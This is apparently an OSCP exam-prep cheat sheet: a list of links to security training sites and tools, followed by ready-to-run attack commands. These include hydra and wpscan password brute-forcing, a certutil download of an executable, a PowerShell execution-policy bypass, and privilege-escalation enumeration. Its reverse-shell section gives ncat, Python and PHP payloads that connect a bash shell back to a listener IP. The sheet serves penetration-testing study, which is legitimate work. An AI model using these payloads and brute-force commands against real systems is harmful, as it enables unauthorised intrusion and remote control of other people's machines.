## Useful Websites
[offical exam guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) <br>
[offical exam report](https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf) <br>
[pentest.ws](https://pentest.ws): note taking <br>
[Burp Suite](https://portswigger.net/burp): tool for exploring web security. [Configure browser with Burp Suite](https://www.youtube.com/results?search_query=Configure+with+Burp+Suite) <br>
[OWASP juice box](https://owasp.org/www-project-juice-shop/): OWASP security trainings<br>
[hack this site]<br>
[over the wire]<br>
[pwnable.kr/xyz]<br>
[hack the box]<br>
[cybrary]<br>
[google gruyeye]<br>
[game of hacks]<br>
[bWAPP]<br>
[Webgoat]<br>
[hashcat](https://hashcat.net/wiki/doku.php?id=hashcat): password recovery tool<br>
[feroxbuster](https://github.com/epi052/feroxbuster): powerful forced browsing tool (gobuster、dirb)<br>
[AutoRecon](https://github.com/Tib3rius/AutoRecon): multi-threaded network reconnaissance tool which performs automated enumeration of services<br>
[explainshell](https://explainshell.com/): explain command-line<br>
[SecLists](https://github.com/danielmiessler/SecLists): It's a collection of multiple types of lists used during security assessments, collected in one place<br>
[Reverse Shell Generator](https://www.revshells.com/): online reverse shell generator<br>
[hacktricks](https://book.hacktricks.xyz/)

## :warning: Exam Restrictions

[linPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/): Understanding the tools/scripts you use in a Pentest<br>
[Official Exam Guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

## :warning: Exam Change

[2022/1/11](https://www.offensive-security.com/offsec/oscp-exam-structure/)

## :hammer_and_wrench: Commands

### :open_file_folder: hydra

Make sure there are no maximum number of login attempts. To perform a manual check.

#### IMAP
```
hydra -L usernames.txt -P wordlists.txt -s 143 -f 192.168.0.1 imap
```

#### PostgreSQL

```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 192.168.121.60 postgres
```

for normal connection

```
psql -U <username> -p 5432 -h <hostname or ip>
```

#### HTTP Basic Authentication 

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /      # (/):default 
```

### :open_file_folder: cewl

```
cewl -d 4 https://192.168.0.1 -w /tmp/wordlists.txt
```

### :open_file_folder: download

#### windows

```
certutil -f -urlcache http://192.168.49.220:8000/veyon-service.exe veyon-service.exe
```
### :open_file_folder: nmap

```
nmap -T5 192.168.10.0/24
```

```
nmap -Pn -p- -sC -sV -T4 192.168.201.159 
```

### :open_file_folder: reverse shell

ncat 

```
ncat -e /bin/bash 192.168.10.58 8080
```

python3(file)

```Python
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.49.130",80)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])
```

python(file)

```Python
#!/usr/bin/env python
import os
import sys
try: 
        os.system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.112\",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'") 
except: 
        print 'ERROR...' 
sys.exit(0) 
```

php(file)

```Php
<?php system(\"nc -e /bin/bash 192.168.1.100 80\"); ?>
```

### :open_file_folder: Cron jobs

```
crontab -l
```
```
ls -alh /etc/cron.* /etc/at*
```
```
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

unprivileged Linux process snooping: [pspy](https://github.com/DominicBreuker/pspy)

### :open_file_folder: WordPress 

[WPScan](https://github.com/wpscanteam/wpscan)

Finding application

```
wpscan --url http://192.168.0.1/
```

Enumerating valid usernames

```
wpscan --url http://192.168.0.1/ --enumerate u1-1000
```

Enumerating themes

```
wpscan --url http://192.168.0.1/ -e at
```

```
curl -k -s http://192.168.0.1/wp-content/themes/ | html2text
```

```
curl -s -X GET http://192.168.0.1 | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

Enumerating plugins

```
wpscan --url http://192.168.0.1/ -e ap
```

```
curl -k -s http://192.168.0.1/wp-content/plugins/ | html2text
```

```
curl -s -X GET http://192.168.0.1 | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

Brute-force attack

```
wpscan --url http://192.168.0.1/ --passwords /usr/share/wordlists/rockyou.txt --max-threads 50 --usernames admin
```

SSL peer certificate or SSH remote key was not OK

```
wpscan --url https://192.168.0.1/ --disable-tls-checks
```

### :open_file_folder: LFI

#### [LFI Suite](https://github.com/D35m0nd142/LFISuite)

file in Windows

```
C:\Windows\System32\drivers\etc\hosts
```

### :open_file_folder: find 

avoid permission denied messages

```Shell
find / -name *kali* 2>&-
```

### :open_file_folder: AutoRecon

```
git clone https://github.com/Tib3rius/AutoRecon.git

cd AutoRecon

sudo python3 autorecon.py <target IP> --dirbuster.wordlist "" #skip directory busting to speed up results
```

## 🖥️ Linux

Typical site folders

```
/srv/http/
/var/www/html/
```

Writable file

```Shell
find / -writable -type  f 2>/dev/null | grep -v "/proc/"
```

## 🖥️ Windows

### :open_file_folder: [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)

Performs the operation on all specified files in the current directory and its subdirectories.

```
icacls <directory> /t
```

Remarks

```
A sequence of simple rights:

F - Full access

M - Modify access

RX - Read and execute access

R - Read-only access

W - Write-only access
```

### :open_file_folder: PowerShell

bypass

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\Windows\Temp\xxx.ps1
```

zip

```
Compress-Archive -Path C:\Users\guest\Desktop\dist -DestinationPath C:\Users\guest\Desktop\dist
```

unzip

```
Expand-Archive -LiteralPath C:\Users\guest\Desktop\dist.zip -DestinationPath C:\Users\guest\Desktop
```

### :open_file_folder: others

xxx is not recognized as an internal or external command, operable program or batch file.

```
C:\Windows\SysWOW64
C:\Windows\System32
```

### :open_file_folder: [IIS-ShortName-Scanner](https://github.com/irsdl/iis-shortname-scanner)
